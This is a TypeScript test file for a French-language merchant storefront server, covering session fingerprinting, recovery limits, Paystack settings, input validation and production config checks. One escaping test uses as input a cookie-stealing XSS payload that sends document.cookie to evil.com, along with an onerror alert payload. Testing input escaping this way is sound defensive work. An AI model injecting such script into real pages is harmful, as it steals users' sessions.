import test from 'node:test';
import assert from 'node:assert/strict';
import {
  isBlockedStaticAsset,
  buildSessionFingerprint,
  isRequestFingerprintMatch,
  checkAndRegisterRecoveryAttempt,
  resetRecoveryAttemptsForTests,
  rotateMerchantAccessTokenForShop,
  getSubscriptionPlanConfig,
  buildPaymentInstructionMessage,
  getPaystackConfig,
  buildPaystackCheckoutPayload,
  isPaymentReferenceProcessed,
  markPaymentReferenceProcessed,
  activateShopSubscription,
  escapeHtml,
  sanitizeTextField,
  validateCustomerOrderInput,
  validateRuntimeConfig,
  shouldSeedDemoData,
  saveMerchantSessionRecord,
  getMerchantSessionRecord,
  deleteMerchantSessionRecord,
} from '../server.ts';

test('blocks backend bundles and sourcemaps from public static serving', () => {
  assert.equal(isBlockedStaticAsset('/server.cjs'), true);
  assert.equal(isBlockedStaticAsset('/server.cjs.map'), true);
  assert.equal(isBlockedStaticAsset('/assets/index.js'), false);
  assert.equal(isBlockedStaticAsset('/manifest.json'), false);
});

test('binds a merchant session to the current request fingerprint', () => {
  const req = {
    headers: {
      'x-forwarded-for': '203.0.113.42',
      'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
      'accept-language': 'fr-FR,fr;q=0.9',
    },
    socket: { remoteAddress: '127.0.0.1' },
    ip: '203.0.113.42',
  } as any;

  const fingerprint = buildSessionFingerprint(req);
  assert.equal(isRequestFingerprintMatch({ fingerprint }, req), true);
  assert.equal(isRequestFingerprintMatch({ fingerprint: 'different-fingerprint' }, req), false);
});

test('ignores spoofed x-forwarded-for values when binding a session fingerprint', () => {
  const firstReq = {
    headers: {
      'x-forwarded-for': '203.0.113.42',
      'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
      'accept-language': 'fr-FR,fr;q=0.9',
    },
    socket: { remoteAddress: '127.0.0.1' },
    ip: '203.0.113.42',
  } as any;

  const secondReq = {
    headers: {
      'x-forwarded-for': '8.8.8.8',
      'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
      'accept-language': 'fr-FR,fr;q=0.9',
    },
    socket: { remoteAddress: '127.0.0.1' },
    ip: '203.0.113.42',
  } as any;

  assert.equal(buildSessionFingerprint(firstReq), buildSessionFingerprint(secondReq));
  assert.equal(isRequestFingerprintMatch({ fingerprint: buildSessionFingerprint(firstReq) }, secondReq), true);
});

test('persists merchant sessions in SQLite so they survive a server restart', () => {
  const token = 'restart-session-test-token';
  const session = {
    shopId: 42,
    expiresAt: Date.now() + 60 * 60 * 1000,
    fingerprint: 'session-fingerprint-v1',
  };

  saveMerchantSessionRecord(token, session);
  assert.deepEqual(getMerchantSessionRecord(token), session);

  deleteMerchantSessionRecord(token);
  assert.equal(getMerchantSessionRecord(token), null);
});

test('limits merchant recovery attempts to two per 24h window', () => {
  resetRecoveryAttemptsForTests();

  assert.equal(checkAndRegisterRecoveryAttempt(999).allowed, true);
  assert.equal(checkAndRegisterRecoveryAttempt(999).allowed, true);
  assert.equal(checkAndRegisterRecoveryAttempt(999).allowed, false);
  assert.equal(checkAndRegisterRecoveryAttempt(999).remaining, 0);
});

test('rotates the merchant access token during a valid recovery flow', () => {
  const oldToken = 'old-token-123';
  const newToken = rotateMerchantAccessTokenForShop(1, oldToken);

  assert.ok(newToken);
  assert.notEqual(newToken, oldToken);
  assert.equal(newToken.length > 10, true);
});

test('keeps Paystack as the only active payment provider when it is configured', () => {
  process.env.PAYSTACK_PUBLIC_KEY = 'pk_test_demo';
  process.env.PAYSTACK_SECRET_KEY = 'sk_test_demo';
  process.env.PAYSTACK_WEBHOOK_SECRET = 'whsec_demo';

  const message = buildPaymentInstructionMessage('Boutique Demo', 'premium', 4000, 'https://paystack.com/test', 'paystack');

  assert.equal(message.includes('Paystack'), true);
  assert.equal(message.includes('WhatsApp'), false);
  assert.equal(message.includes('Envoyez votre reçu'), false);
});

test('exposes the three paid subscription plans with the expected amounts', () => {
  assert.deepEqual(getSubscriptionPlanConfig('standard'), {
    tier: 'standard',
    amount: 3000,
    label: 'Standard',
    description: 'Vitrine + catalogue + commandes',
  });

  assert.deepEqual(getSubscriptionPlanConfig('premium'), {
    tier: 'premium',
    amount: 4000,
    label: 'Premium',
    description: 'Tout Standard + thèmes premium',
  });

  assert.deepEqual(getSubscriptionPlanConfig('pro'), {
    tier: 'pro',
    amount: 5000,
    label: 'Pro',
    description: 'Tout Premium + studio avancé',
  });
});

test('builds a clear WhatsApp payment instruction with the 20-minute deadline', () => {
  const message = buildPaymentInstructionMessage('Boutique Demo', 'premium', 4000, 'https://wa.me/2250700000000?text=Je%20paie');

  assert.match(message, /Boutique Demo/);
  assert.match(message, /4000/);
  assert.match(message, /20 minutes/i);
  assert.match(message, /https:\/\/wa\.me\/2250700000000\?text=Je%20paie/i);
});

test('treats a processed Paystack reference as the source of truth for activation', async () => {
  const reference = `MAT-RENEWAL-REF-${Date.now()}`;
  const shop = {
    id: 99,
    name: 'Boutique Test',
    slug: 'boutique-test',
    whatsapp_number: '+2250708091011',
    pin_code_hash: 'hashed-pin',
    theme_color: '#0f172a',
    welcome_message: 'Bienvenue',
    is_open: true,
    is_active: true,
    payment_status: 'approved',
    payment_deadline_at: null,
    selected_subscription_tier: 'premium',
    subscription_expires_at: '2026-09-12T00:00:00.000Z',
    last_notification_sent_at: null,
    created_at: new Date().toISOString(),
    category: 'fashion',
    city: 'Abidjan',
    subscription_tier: 'premium',
    theme_config: { primary_color: '#0f172a', secondary_color: '#f8fafc', font_family: 'Plus Jakarta Sans', layout_style: 'grid_portrait' },
  } as any;

  assert.equal(isPaymentReferenceProcessed('paystack', reference, shop.id), false);
  assert.equal(markPaymentReferenceProcessed('paystack', reference, shop.id, 'premium', 4000), true);
  assert.equal(isPaymentReferenceProcessed('paystack', reference, shop.id), true);

  const activated = await activateShopSubscription(shop, 'premium', 'paystack', reference, 4000);

  assert.equal(activated.activated, false);
  assert.equal(activated.already_processed, true);
  assert.equal(shop.payment_status, 'approved');
  assert.equal(shop.is_active, true);
  assert.equal(shop.subscription_expires_at.length > 0, true);
  assert.equal(isPaymentReferenceProcessed('paystack', reference, shop.id), true);
});

test('escapes HTML in merchant-controlled shop metadata before rendering', () => {
  const rawTitle = 'Ma Boutique"></title><script>fetch("https://evil.com/?c="+document.cookie)</script>';
  const rawMessage = 'Bonjour <img src=x onerror=alert(1)>';

  assert.equal(escapeHtml(rawTitle), 'Ma Boutique&quot;&gt;&lt;/title&gt;&lt;script&gt;fetch(&quot;https://evil.com/?c=&quot;+document.cookie)&lt;/script&gt;');
  assert.equal(sanitizeTextField(rawMessage, 80), 'Bonjour');
});

test('rejects malformed or oversized order customer data', () => {
  const invalidPhone = validateCustomerOrderInput({
    customer_name: 'A',
    customer_phone: '123',
    delivery_location: 'Lieu',
    delivery_note: 'x'.repeat(600),
  });

  const valid = validateCustomerOrderInput({
    customer_name: 'Alice Dupont',
    customer_phone: '+2250708091011',
    delivery_location: 'Cocody Riviera 3',
    delivery_note: 'Bonjour',
  });

  assert.equal(invalidPhone.ok, false);
  assert.equal(valid.ok, true);
  assert.equal(valid.customer_phone, '+2250708091011');
});

test('skips demo data seeding in production unless explicitly enabled', () => {
  const previous = {
    NODE_ENV: process.env.NODE_ENV,
    DEMO_MODE: process.env.DEMO_MODE,
  };

  try {
    process.env.NODE_ENV = 'production';
    delete process.env.DEMO_MODE;
    assert.equal(shouldSeedDemoData(), false);

    process.env.DEMO_MODE = 'true';
    assert.equal(shouldSeedDemoData(), true);
  } finally {
    if (previous.NODE_ENV === undefined) delete process.env.NODE_ENV; else process.env.NODE_ENV = previous.NODE_ENV;
    if (previous.DEMO_MODE === undefined) delete process.env.DEMO_MODE; else process.env.DEMO_MODE = previous.DEMO_MODE;
  }
});

test('rejects placeholder production app URLs', () => {
  const previous = {
    NODE_ENV: process.env.NODE_ENV,
    ADMIN_ACCESS_KEY: process.env.ADMIN_ACCESS_KEY,
    APP_URL: process.env.APP_URL,
    PORT: process.env.PORT,
    MATABLE_DB_PATH: process.env.MATABLE_DB_PATH,
  };

  try {
    process.env.NODE_ENV = 'production';
    process.env.ADMIN_ACCESS_KEY = 'production-admin-access-key-2026-strong';
    process.env.APP_URL = 'https://example.com';
    process.env.PORT = '3000';
    process.env.MATABLE_DB_PATH = './data/matable.db';

    assert.throws(() => validateRuntimeConfig(), /APP_URL.*example/i);
  } finally {
    if (previous.NODE_ENV === undefined) delete process.env.NODE_ENV; else process.env.NODE_ENV = previous.NODE_ENV;
    if (previous.ADMIN_ACCESS_KEY === undefined) delete process.env.ADMIN_ACCESS_KEY; else process.env.ADMIN_ACCESS_KEY = previous.ADMIN_ACCESS_KEY;
    if (previous.APP_URL === undefined) delete process.env.APP_URL; else process.env.APP_URL = previous.APP_URL;
    if (previous.PORT === undefined) delete process.env.PORT; else process.env.PORT = previous.PORT;
    if (previous.MATABLE_DB_PATH === undefined) delete process.env.MATABLE_DB_PATH; else process.env.MATABLE_DB_PATH = previous.MATABLE_DB_PATH;
  }
});

test('rejects unsafe production configuration and mock Paystack mode', () => {
  const previous = {
    NODE_ENV: process.env.NODE_ENV,
    ADMIN_ACCESS_KEY: process.env.ADMIN_ACCESS_KEY,
    APP_URL: process.env.APP_URL,
    PORT: process.env.PORT,
    MATABLE_DB_PATH: process.env.MATABLE_DB_PATH,
    PAYSTACK_MOCK_MODE: process.env.PAYSTACK_MOCK_MODE,
  };

  try {
    process.env.NODE_ENV = 'production';
    process.env.ADMIN_ACCESS_KEY = 'production-admin-access-key-2026-strong';
    process.env.APP_URL = 'https://matable.ci';
    process.env.PORT = '3000';
    process.env.MATABLE_DB_PATH = './data/matable.db';
    process.env.PAYSTACK_MOCK_MODE = 'true';

    assert.throws(() => validateRuntimeConfig(), /PAYSTACK_MOCK_MODE.*production/i);

    delete process.env.PAYSTACK_MOCK_MODE;
    process.env.ADMIN_ACCESS_KEY = '03062004';
    assert.throws(() => validateRuntimeConfig(), /ADMIN_ACCESS_KEY.*32 caractères/i);

    process.env.ADMIN_ACCESS_KEY = 'production-admin-access-key-2026-strong';
    process.env.APP_URL = 'not-a-valid-url';
    assert.throws(() => validateRuntimeConfig(), /APP_URL.*URL publique/i);

    process.env.APP_URL = 'https://matable.ci';
    process.env.PORT = '0';
    assert.throws(() => validateRuntimeConfig(), /PORT .* 1 et 65535|PORT doit être/i);
  } finally {
    for (const [key, value] of Object.entries(previous)) {
      if (value === undefined) {
        delete process.env[key];
      } else {
        process.env[key] = value;
      }
    }
  }
});

test('keeps Paystack config locked while preserving future payload generation', () => {
  process.env.PAYSTACK_PUBLIC_KEY = 'pk_test_demo';
  process.env.PAYSTACK_SECRET_KEY = 'sk_test_demo';
  process.env.PAYSTACK_WEBHOOK_SECRET = 'whsec_demo';
  process.env.PAYSTACK_CURRENCY = 'NGN';

  const config = getPaystackConfig();
  const payload = buildPaystackCheckoutPayload({
    email: 'merchant@example.com',
    amount: 4000,
    reference: 'MAT-ORDER-1',
    shopName: 'Boutique Demo',
    tier: 'premium',
    callbackUrl: 'http://localhost:3000/paystack/callback',
  });

  assert.equal(config.enabled, false);
  assert.equal(config.publicKey, 'pk_test_demo');
  assert.equal(payload.amount, 400000);
  assert.equal(payload.currency, 'NGN');
  assert.equal(payload.reference, 'MAT-ORDER-1');
  assert.equal(payload.metadata.shop_name, 'Boutique Demo');

  delete process.env.PAYSTACK_PUBLIC_KEY;
  delete process.env.PAYSTACK_SECRET_KEY;
  delete process.env.PAYSTACK_WEBHOOK_SECRET;
  delete process.env.PAYSTACK_CURRENCY;
});
